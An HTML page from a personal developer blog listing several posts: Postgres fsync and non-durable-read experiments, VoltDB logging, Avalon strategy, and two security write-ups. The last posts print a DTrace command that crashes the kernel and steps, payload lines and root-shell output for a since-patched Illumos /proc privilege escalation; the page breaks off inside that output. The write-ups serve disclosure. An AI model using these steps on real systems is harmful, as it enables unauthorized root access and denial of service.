```
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Ben's Blog</title>
  <meta name="author" content="Ben Murphy">

  
  <meta name="description" content="This is an experiment where we try to find out how much faster Postgres will run
if patch it to support non-durable reads. Postgresql supports a &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://benmmurphy.github.com">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="/javascripts/ender.js"></script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <link href="/atom.xml" rel="alternate" title="Ben's Blog" type="application/atom+xml">
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-31750008-1']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">Ben's Blog</a></h1>
  
    <h2>Developer Musings</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="http://google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:benmmurphy.github.com" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2018/07/06/postgresql-non-durable-reads/">Postgresql Non-Durable Reads</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2018-07-06T14:29:46+10:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>This is an experiment where we try to find out how much faster Postgres will run
if patch it to support non-durable reads. Postgresql supports a number of
options when commiting but the ones we are interested in at the moment are
<code>synchronous_commit = on</code> and <code>synchronous_commit = off</code>. When it is set to <code>on</code>
Postgresql will wait until the WAL is properly synchronized to the disk before
returning to the client and when it is <code>off</code> it will not wait at all. Also,
when it is <code>on</code> postgresql will not release any locks or make any tuples visible
to other transactions until the WAL is synchronized to disk. This means if you
have heavy write contention on a particular row then all of your connections
can end up being serialized around fsync().</p>

<p>For example take this query:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>UPDATE counters set counter = counter + 1 where id = 0;</span></code></pre></td></tr></table></div></figure>


<p>If you run this using pg_bench and 128 clients on Macbook Air with
<code>wal_sync_method = fsync</code> and <code>synchronous_commit = on</code> you will get around
1283 transaction/s. This is with an fsync cost of about 0.2 ms. If you
change <code>wal_sync_method = fsync_writethrough</code> this increases the fsync cost
to about 10ms and the throughput will drop to around 90 transaction/s. If you
switch <code>synchronous_commit = off</code> this will increase perforamnce and you will
get around 2611 transaction/s. However, this is kind of unsafe and you might
lose transactions that you think have been committed if you have a sudden loss
of power.</p>

<p>Now, we have made a change to postgresql to drop its locks and record the
transaction as visible and then wait for the WAL log to be synchronised to disk.
This gives you similar guarantees to <code>synchronous_commit = on</code> and similar
performance to <code>synchronous_commit = off</code> when there is high contention. When,
there is low contention it has similar performance to <code>synchronous_commit = on</code>.</p>

<p>After, this change we get 3321 transactions/s which is about 2.5 times better
performance that <code>synchronous_commit = on</code> and suspiciously even higher
than <code>synchronous_commit = off</code>. Currently, I don&rsquo;t have an explanation for this
and it would seem to indicate that there is an implementation error in the
patch. (Definitely, do no trust this patch with real data this is currently just
an experiment.) I would expect that this new mode would perform strictly worse
than <code>synchronous_commit = off</code>.</p>

<p>It also important to note that using this setting
<code>sychronous_commit = local_non_durable_reads</code> will produce read anomalies that
can be similar to the write anomalies you get with <code>sychronous_commit = off</code>.
For example if you insert an tuple and it fails with a unique check then you
later try to read that tuple then it is possible it won&rsquo;t be there anymore
because the original write was not durable when the read was performed for the
unique check. But for this counter example it is 100% safe as long as you never
try to read the value of the counter :)</p>

<p>If there is any interest in this I might try to upstream the patch into PG. I&rsquo;m
just not sure if there are people running with high enough contention and high
enough fsync times to make this setting useful.</p>

<p><a href="https://github.com/postgres/postgres/compare/master...benmmurphy:non_durable_reads">NonDurableReadPatch</a>
<a href="https://gist.github.com/benmmurphy/49e83da3f8b0793627e4a02e0d154c82">Benchmarks</a></p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2018/06/07/voltdb-command-logging-quirks/">VoltDB Command Logging Quirks</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2018-06-07T19:32:09+10:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Since the <a href="/blog/2018/06/01/fsync-db-lock-contention/">last post</a> on fsync and
non-durable reads we have had a play around with VoltDB too see if our
speculation with how synchronous command logging works would be consistent
with it&rsquo;s performance.</p>

<p>The first thing we noticed is that read-only transactions wait for the log
interval even if there are no previous write transactions waiting for their
command log to be synced to disk. You can observe this by setting log frequency
to 5000ms (the maximum) and using synchronous logging. Then if you run an
ad-hoc select statement from sqlcmd you will notice that it sometimes takes
the full 5 seconds to return a result. It is important to note read-only
transaction will not wait for a disc sync if there is only read only transactions
in the command log buffer. But even without the sync some read only transactions
will be unecessarily be delayed because they wait for the command log to be
flushed. I have a LD_PRELOAD module that would delay
synchronization by 1 second and I never observed a read-only transaction taking
more than 5 seconds to return a result. However, if there are write transactions
in the buffer then the read-only transaction will wait for the command log to be
synchronised (presumably the data from the read-only transaction isn&rsquo;t actually
written). This waiting for previous write transactions to sync to disk prevents
the non-durable read problem discussed in the previous post.</p>

<p>It is kind of weird that VoltDB unecessarily stalls some read transactions but
this is probably not a big deal with real workloads because frequency will be
set to 1ms and most workloads are a mix of read and writes and writes will
always cause the command log to be synchronised.</p>

<p>Here are some links from VoltDB that explain how command logging
<a href="https://docs.voltdb.com/UsingVoltDB/ChapCmdLog.php">works</a> and can be
<a href="https://docs.voltdb.com/UsingVoltDB/CmdLogConfig.php">configured for optimal performance</a>.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2018/06/02/fsync-db-lock-contention/">FSync DB Lock Contention</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2018-06-02T04:46:30+10:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Lets say you have a table in a database that you are using to keep track of a
counter value. So something like:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Column |  Type   | Modifiers
</span><span class='line'>--------+---------+-----------
</span><span class='line'> id     | integer | not null
</span><span class='line'> count  | integer | not null
</span><span class='line'>Indexes:
</span><span class='line'>    "test_pkey" PRIMARY KEY, btree (id)</span></code></pre></td></tr></table></div></figure>


<p>If you have lots of connections updating values doing the query: <code>update
test set count = count + 1 where id = $1;</code> then on postgresql you should have
very decent performance as long as the id values do not overlap too much. Even
though postgresql needs to fsync the WAL to disk for each commit it is able to
amortise the cost of this over many commits if the commits start to queue up
because fsyncing is slow. For example the WAL fsyncs might be something like:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>update test set count = count + 1 where id = 1
</span><span class='line'>FSYNC WAL
</span><span class='line'>update test set count = count + 1 where id = 2
</span><span class='line'>update test set count = count + 1 where id = 3
</span><span class='line'>..
</span><span class='line'>update test set count = count + 1 where id = 100
</span><span class='line'>FSYNC WAL
</span><span class='line'>update test set count = count + 1 where id = 101
</span><span class='line'>update test set count = count + 1 where id = 102
</span><span class='line'>..
</span><span class='line'>update test set count = count + 1 where id = 200
</span><span class='line'>FSYNC WAL</span></code></pre></td></tr></table></div></figure>


<p>However, if the id values overlap and in the worst case if they are all the same
then not only do you have a problem with lock contention but you also have a
problem with serializing all of the fsyncs. Postgresql and presumably any sane
RDBMS will hold a write lock on the updated records until the transaction is
durable. So you end up getting all the WAL fsyncs done in a completely serial
order.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>update test set count = count + 1 where id = 1
</span><span class='line'>FSYNC WAL
</span><span class='line'>update test set count = count + 1 where id = 1
</span><span class='line'>FSYNC WAL
</span><span class='line'>update test set count = count + 1 where id = 1
</span><span class='line'>FSYNC WAL
</span><span class='line'>update test set count = count + 1 where id = 1
</span><span class='line'>FSYNC WAL</span></code></pre></td></tr></table></div></figure>


<p>Before the land of SSDs this would be absolutely horrible. If you are paying
6ms for a fsync then it completely destroys your throughput (166 fsync/s). But
now with SSDs (or previously with battery backed caches) the fsync cost is much
lower so this is less of an issue. For example with Amazon EBS I see fsync cost
of around 0.5ms (2000 fsync/s) and i3 NVME performance of ~0.05ms
(20000 fsync/s).</p>

<p>Is it possible for an RDBMs to fix this fsync problem? So when you think about
it an RDBMs could drop all the locks a transaction has once it has decided that
nothing except for the WAL fsync would prevent it from committing. This would
kind of work because another transaction that would modify the same row would
be dependent on the previous WAL segments committing before it could commit.
However, this opens up a big consistency hole in the way clients interact
with the database. For example you could see this happening:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>TX1: BEGIN;
</span><span class='line'>TX1: insert into test(id) values(1);
</span><span class='line'>TX1: COMMIT;
</span><span class='line'>
</span><span class='line'>&lt;TX1 not fsync'd>
</span><span class='line'>
</span><span class='line'>TX2: BEGIN;
</span><span class='line'>TX2: insert into test(id) values(1);
</span><span class='line'>
</span><span class='line'>&lt;instead of blocking here for TX1 to commit it raises unique error>
</span><span class='line'>
</span><span class='line'>DB: POWER FAILURE &lt;TX1 is never committed></span></code></pre></td></tr></table></div></figure>


<p>Here we see a case where the second transaction observes data in the database
that was not durable. It might think that because the record is already in
the database it can do something else with an external system and then we end
up having a problem. This particular case is also weird because the transaction
gets in a state where it can&rsquo;t be committed. If you successfully commit a
transaction that has touched non-durable records then all the reads are safe
because the records would now be durable after the commit. But a transaction
with an error is not committable so you would also need to add a weird hook
where a rollback (or implicit rollback) might have to wait for other
transactions to fsync before returning to the client.</p>

<p>Also, transactions that did not modify data would normally have a no-op commit
but if they were shown non-durable records they would need to potentially wait
to commit.</p>

<p>Basically, it could kind of work as long as all transactions waited for a
successful commit/rollback before acting on any data they read from the DB
but this does not seem realistic.</p>

<p>If you look at VoltDB it looks like they only let you do transactions inside
stored procedures. I&rsquo;ve also seen a comment along the lines that they do batch
commits. Considering, they are single threaded presumably they handle a bunch
of transactions on the thread and add them to a queue that is fsynced in batches
then the results from the stored procedures are sent back to the client. This
presumably removes any of the consistency problems you have from a system
that has external transactions where non-durable reads can escape.</p>

<p>If you want to play around with postgresql to see what effects wal fsync delay
has I have a LD_PRELOAD library that will add 10s to every fsync.
<a href="https://github.com/benmmurphy/wal_delayer">wal_delayer</a></p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2017/08/09/mechanically-solving-avalon/">Mechanically Solving Avalon</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2017-08-09T06:48:48+10:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>I&rsquo;ve been thinking for a while if it is possible for the &lsquo;good&rsquo; team in Avalon to follow some optimal strategy that would always achieve victory. To simplify things this post will focus on finding an optimal strategy for 5 person Avalon when the Merlin(Commander) and the Assassin are both in play. It is important to note in this variant the &lsquo;good&rsquo; team at best can only win on average 2/3 of games because the &lsquo;evil&rsquo; team can always randomly pick the Merlin at the end of the game and will guess correctly 1 in 3 times. This question has also been answered before on <a href="https://boardgames.stackexchange.com/questions/20476/solution-to-avalon-board-game">stackexchange</a> but we will try and answer it without crypto. But we will use something very similar to crypto and similar strategies so I&rsquo;m not sure if we are adding anything useful.</p>

<p>The 5 person Avalon game is interesting because there are only 2 &lsquo;evil&rsquo; and 3 &lsquo;good&rsquo; people. This creates an easy mechanism to solve the game.</p>

<ol>
<li><p>After the game has been setup everyone secretly writes down a list of people they know are good. Merlin writes down the people who knows are good. Other good people pretend to write down a list of people but instead write gibberish.</p></li>
<li><p>The lists are shuffled.</p></li>
<li><p>There will be either 1, 2 or 3 non-gibberish lists depending on what the &lsquo;evil&rsquo; people do.</p></li>
<li><p>If there is 1 non-gibberish list the &lsquo;good&rsquo; teams wins by just following the list because this is Merlin&rsquo;s list.</p></li>
<li><p>If there is 2 or 3 non-gibberish lists then follow one list until it fails then switch to the other list. It is only possible for at most 2 missions to fail because after a list fails it is no longer used to pick teams. If only 2 missions fail then 3 missions succeed and the good team wins.</p></li>
</ol>


<p>The strategy also shows why the Assassin is so important in the 5 player variant. Because without the Assassin the Commander could just announce themselves and even if the evil team optimally bluffed and impersonated the Commander themselves they would still be guaranteed to lose.</p>

<p>This strategy only works when there are 2 &lsquo;evil&rsquo; players so only in the 5 and 6 player variants. Once a third &lsquo;evil&rsquo; player is introduced it is possible to fail 3 missions using 3 evil lists.</p>

<p>Can we solve 7+ player games using this strategy?</p>

<p>If we have 3 evil players then we need to eliminate a list initially or run a mission that will eliminate two lists instead of one.</p>

<p>Unlike the stackexchange solution we don&rsquo;t have a way to identify the author of a list so some of the strategies for eliminating lists do not work. However, we can still:</p>

<ol>
<li><p>If a mission fails then any list that contains all the members of the failing mission is also a bad list.</p></li>
<li><p>If a mission fails and none of the members of the failing mission is in the compliment of a list then this list is a bad list.</p></li>
<li><p>Any members common to all lists are good.</p></li>
</ol>


<p>To test whether evil players have a winning strategy it should be possible to brute force all the combinations of evil lists: 7C4<sup>3</sup> + 7C4<sup>2</sup> + 7C4 => 44135 and see if any of them can&rsquo;t be solved by an optimal good team.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2017/08/09/avalon-fonix-slash-grabyo-meta-snapshot/">Avalon Fonix/Grabyo Meta Snapshot</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2017-08-09T06:41:33+10:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>For those that don&rsquo;t know <a href="https://boardgamegeek.com/boardgame/128882/resistance-avalon">Avalon</a> (or <a href="https://boardgamegeek.com/boardgame/41114/resistance">The Resistance</a>) is a board game where a &lsquo;good&rsquo; team which consist of the majority of players attempt to pass 3 missions while an &lsquo;evil&rsquo; team which consist of a minority of the players try to sabotage them. The &lsquo;evil&rsquo; team achieves this objective by convincing the other players to put them on missions and then failing the missions. The &lsquo;evil&rsquo; team is in a better position to do this because they know who all the other &lsquo;evil&rsquo; players are and can coordinate their voting or influence discussions to achieve their objective. On the other hand the &lsquo;good&rsquo; team is generally in the dark about the identity of the other players except for a few important exceptions.</p>

<p>We generally play 10 players with the Commander (Merlin), Bodyguard (Percival), Deep Cover (Mordred) and False Commander (Morgana) characters. The Commander knows who all the evil characters are except for Deep Cover. The Bodyguard knows who the Commander and False Commander is but doesn&rsquo;t know which is which. We also use the Lady of the Lake which allows its holder after the second round to find out which team another play is on privately. The person being interrogtated cannot lie but the person receiving the information can lie or tell the truth to the rest of the table. The Lady of the Lake token then passes to the player that was interrogated and they get an opportuntity to use it on the next round and so forth. We also sometimes play only vanilla resistance without characters but with plot cards.</p>

<p>Because we play a lot with each other some interesting behaviour has emerged. Firstly, we have a house technique which allows multiple evil players to coordinate failing a mission. For example in a 3 player mission with two evil players it would be a disaster if both evil players put in a fail card. So it has evolved that the person who proposed the mission or the first evil player clockwise (the first evil player to pick the next mission) from the person who proposed the mission is responsible for failing the mission. This removes a lot of deductive ability from the good team because it is difficult to assume that there is only 1 evil player in a mission if it fails.</p>

<p>We have also noticed that a lot of missions in the first round will be forced to the last pick because in the ten player games it is very difficult to get 6 good people (all the good people) to coordinate on picking a team. So generally the only way a mission passes before the last pick in the first round is because of evil shenanigans so good people are wary of voting for a team they are not on. This often means the position of the players has a large effect on the outcome of the game.</p>

<p>A lot of the games lately are being won by the good team but then the win is being overturned by the assassin. In the latest game the Assassin was not picked because they provided the most useful information to the table, they actually did very little, but rather because they made no incorrect statements. The evil team is often very focused on finding the Commander even to the detriment of getting a clean win.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2017/03/07/dtrace-division-by-zero/">DTrace Division by Zero</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2017-03-07T19:55:03+10:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>For some background check John Regehr&rsquo;s <a href="http://blog.regehr.org/archives/887">excellent post</a> on the history of problems caused by dividing INT_MIN by -1. DTrace is an interpreter that runs inside the kernel on both Illumos and OSX. Before it was <a href="https://github.com/joyent/illumos-joyent/commit/8a5ff7873220bd2725876b6ef7fdd2bceff60dd3">patched</a> in Illumos it was possible to create an expression to divide INT_MIN by -1 and this would cause the kernel to crash.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sudo dtrace -n 'BEGIN{v = 0x8000000000000000LL; print((long)v/-1)}'
</span><span class='line'>sudo dtrace -n 'BEGIN{v = 0x8000000000000000LL; print((long)v%-1)}'</span></code></pre></td></tr></table></div></figure>


<p>This is still an issue in OSX. I emailed them a month ago along with links to other DTrace issues that have been fixed in Illumos and not OSX and haven&rsquo;t heard back. Since this is not really a security issue I&rsquo;m posting it here. You need root in order to trigger the DTrace division by zero and if you have root you can already reboot the machine :/. You also need root to trigger all of the other issues.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2017/01/31/local-privilege-escalation-in-illumos-via-slash-proc/">Local Privilege Escalation in Illumos via /proc</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2017-01-31T19:00:00+10:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>The /proc permissions in Illumos were optional. I&rsquo;m not sure how long this has been an issue but looking at the <a href="https://github.com/joyent/illumos-joyent/commits/fee52838cd1191a3efe83b67de7bccdd401af35e/usr/src/uts/common/fs/proc/prvnops.c">history</a> of the files associated with the permission check I could not find where the problem was introduced. I checked if this was also an issue in Solaris but this had been fixed in Solaris. However, I could not find the CVE associated with this fix. My suspicion is that this has been an issue prior to the Illumos fork and was found by Solaris engineers and fixed in Solaris but not fixed in Illumos.</p>

<p>I found this vulnerability when I was looking for a RBAC bypass. RBAC in Solaris lets you have different named privileges associated with each process. It is possible for a process with a lot of privileges to drop most of them and keep only the ones that it needs. I thought it might be possible for a low privilege process to use /proc to debug a process owned by the same user that had higher privileges. This was because I thought the filesystem permissions would be the only permission check that would be performed. But if I would have checked the <a href="https://docs.oracle.com/cd/E23824_01/html/821-1473/proc-4.html">man page</a> I would have seen:</p>

<blockquote><p>EPERM</p><p><br/>An attempt was made to control a process of which the E, P, and I privilege sets were not a subset of the effective set of the controlling process or the limit set of the controlling process is not a superset of limit set of the controlled process.</p></blockquote>


<p>But I didn&rsquo;t check the man page and just tried to write to a /proc file of a higher privileged process using bash.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>echo "wat" &gt; /proc/23912/lwp/1/lwpctl</span></code></pre></td></tr></table></div></figure>


<p>Which instead of giving a permission error gave back an I/O error.</p>

<p>This issue can be demonstrated via the following commands:</p>

<p>First we drop the sys_mount permission which will prevent us from opening proc on our
parent bash process because we have a subset of permissions.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ppriv -s A-sys_mount -e /bin/bash
</span><span class='line'>[root@web01 ~]# ppriv $$
</span><span class='line'>23929:  /bin/bash
</span><span class='line'>flags = PRIV_AWARE
</span><span class='line'>        E: basic
</span><span class='line'>        I: basic
</span><span class='line'>        P: basic
</span><span class='line'>        L: basic,contract_event,contract_identity,contract_observer,dtrace_proc,dtrace_user,file_chown,file_chown_self,file_dac_execute,file_dac_read,file_dac_search,file_dac_write,file_owner,file_setid,ipc_dac_read,ipc_dac_write,ipc_owner,net_bindmlp,net_icmpaccess,net_mac_aware,net_observability,net_privaddr,net_rawaccess,proc_audit,proc_chroot,proc_lock_memory,proc_owner,proc_prioup,proc_setid,proc_taskid,sys_acct,sys_admin,sys_audit,sys_fs_import,sys_ip_config,sys_iptun_config,sys_nfs,sys_ppp_config,sys_resource,sys_smb</span></code></pre></td></tr></table></div></figure>


<p>Next, we try and open the parent process lwpctl and it correctly fails.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@web01 ~]# ps
</span><span class='line'>  PID TTY         TIME CMD
</span><span class='line'>23929 pts/4       0:00 bash
</span><span class='line'>23911 pts/4       0:00 login
</span><span class='line'>23912 pts/4       0:00 bash
</span><span class='line'>23935 pts/4       0:00 ps
</span><span class='line'>
</span><span class='line'>python
</span><span class='line'>
</span><span class='line'>&gt;&gt;&gt; os.open("/proc/23912/lwp/1/lwpctl", os.O_WRONLY)
</span><span class='line'>Traceback (most recent call last):
</span><span class='line'>  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
</span><span class='line'>OSError: [Errno 13] Permission denied: '/proc/23912/lwp/1/lwpctl'</span></code></pre></td></tr></table></div></figure>


<p>Next, we open the file with O_CREAT and it incorrectly succeeds.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&gt;&gt;&gt; os.open("/proc/24421/lwp/1/lwpctl", os.O_CREAT|os.O_APPEND|os.O_WRONLY)
</span><span class='line'>3</span></code></pre></td></tr></table></div></figure>


<p>In Illumos there is the concept of a VNode which is contains a bunch of pointers to methods that are used by the kernel to interact with the filesystem. When a file is opened the kernel will call a <code>#access</code> method on the VNode first and then will call the open method on the VNode if it the <code>#access</code> succeeds. However, in the case when O_CREAT is passed the kernel will only call the #create method and it will assume the <code>#create</code> method will also call the <code>#access</code> method. In the case of the /proc file system this was not happening so anybody could pass in O_CREAT and no permission check would occur so the open would always succeed. Since there is no other checks not only does this work as an RBAC bypass it always works as a privilege escalation from non-root to root. It is important to note that Zone&rsquo;s contain this issue and it doesn&rsquo;t seem possible to use this as a way of escalating your privileges outside of a Zone.</p>

<p>If you look at the <a href="https://github.com/joyent/illumos-joyent/commit/fee52838cd1191a3efe83b67de7bccdd401af35e">patch</a> you can see a call to <code>#praccess</code> was added and some other checks as well that I don&rsquo;t understand.</p>

<p>I notified Joyent about this on the 14th of Decemeber and they had a fix commited by the 17th. The advisory from Joyent is available <a href="https://help.joyent.com/hc/en-us/articles/115002310368-Security-Advisory-proc-Filesystem-Permission-Vulnerability">here</a>. The Joyent people are probably quietly cheering on the demise of Solaris because as you can see from this vulnerability security issues might be fixed in Solaris while still being vulnerable in Illumos. One way of looking at this is that Oracle is selling a zero day exploit feed for Joyent&rsquo;s public cloud. Though, it is probably not that bad because the code bases have diverged a bit.</p>

<h1>Exploit</h1>

<p>I have an <a href="https://github.com/benmmurphy/illumos_playground/tree/master/proc_escalation">exploit</a> for this that will use the lwp_agent to create a file <code>/tmp/elevator</code> that is suid root. It also uses the <code>lwp_agent</code> to write a program to this file that contains:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>  setuid(0);
</span><span class='line'>  setgid(0);
</span><span class='line'>  execv("/bin/bash");</span></code></pre></td></tr></table></div></figure>


<p>It can be compiled via:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>  gcc -nostdlib -static bash.s -o bash
</span><span class='line'>  gcc -o go go.c</span></code></pre></td></tr></table></div></figure>


<p>Example output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>  root@web01:~# id
</span><span class='line'>  uid=1000(ben) gid=1(other) groups=1(other)
</span><span class='line'>
</span><span class='line'>  root@web01:~# ppriv $$
</span><span class='line'>  36695:  sh
</span><span class='line'>  flags = &lt;none&gt;
</span><span class='line'>    E: basic
</span><span class='line'>    I: basic
</span><span class='line'>    P: basic
</span><span class='line'>    L: basic,contract_event,contract_identity,contract_observer,dtrace_proc,dtrace_user,file_chown,file_chown_self,file_dac_execute,file_dac_read,file_dac_search,file_dac_write,file_owner,file_setid,ipc_dac_read,ipc_dac_write,ipc_owner,net_bindmlp,net_icmpaccess,net_mac_aware,net_observability,net_privaddr,net_rawaccess,proc_audit,proc_chroot,proc_lock_memory,proc_owner,proc_prioup,proc_setid,proc_taskid,sys_acct,sys_admin,sys_audit,sys_fs_import,sys_ip_config,sys_iptun_config,sys_mount,sys_nfs,sys_ppp_config,sys_resource,sys_smb
</span><span class='line'>
</span><span class='line'>  root@web01:~# ps auxww |grep vi
</span><span class='line'>  root     36626  0.0  0.2 5012 3344 pts/2    S 21:48:50  0:00 vi /tmp/test
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  root@web01:~# ./go 36626
</span><span class='line'>  found syscall: fefe2255
</span><span class='line'>  file_size: 1464 8046a50
</span><span class='line'>  write returned: 1464
</span><span class='line'>  [root@web01 /root]# id
</span><span class='line'>  uid=0(root) gid=0(root)
</span><span class='line'>  [root@web01 /root]# ppriv $$
</span><span class='line'>  36724:  /bin/bash
</span><span class='line'>  flags = &lt;none&gt;
